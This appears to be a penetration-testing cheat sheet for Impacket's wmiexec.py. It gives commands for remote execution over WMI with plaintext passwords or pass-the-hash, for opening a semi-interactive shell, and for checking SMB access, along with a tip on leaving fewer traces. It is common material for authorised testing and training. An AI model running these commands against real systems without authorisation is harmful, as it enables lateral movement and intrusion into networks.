!!! tip "Tip"
    `impacket-wmiexec domain/user:pass@target` gives a semi-interactive shell. For pass-the-hash: `-hashes :NTLM`. WMI execution leaves fewer traces than PSExec but still generates Event ID 4688 (process creation). Use with caution on monitored networks.

---

## Basic Usage

Run WMIexec with plaintext credentials:

```
wmiexec.py <username>@<target-ip>
```

Example:

```
wmiexec.py Administrator@192.168.1.10 -p 'Password123'
```

---

## Pass-the-Hash (PtH) with WMIexec

If you have an NTLM hash, you can use WMIexec without knowing the plaintext password:

```
wmiexec.py -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.1.10
```

---

## Executing Commands

Run PowerShell commands remotely:

```
wmiexec.py Administrator@192.168.1.10 -p 'Password123' "powershell -c Get-Process"
```

Retrieve system information:

```
wmiexec.py Administrator@192.168.1.10 -p 'Password123' "systeminfo"
```

Query network configuration:

```
wmiexec.py Administrator@192.168.1.10 -p 'Password123' "ipconfig /all"
```

---

## Interactive Shell Mode

WMIexec provides a semi-interactive shell but **does not support full interactive sessions**:

```
wmiexec.py Administrator@192.168.1.10 -p 'Password123'
```

---

## SMB Requirement

For WMIexec to work, **SMB (port 445) must be open** and the **Admin$ share** must be accessible. Verify using:

```
nmap -p 445 --open <target-ip>
```
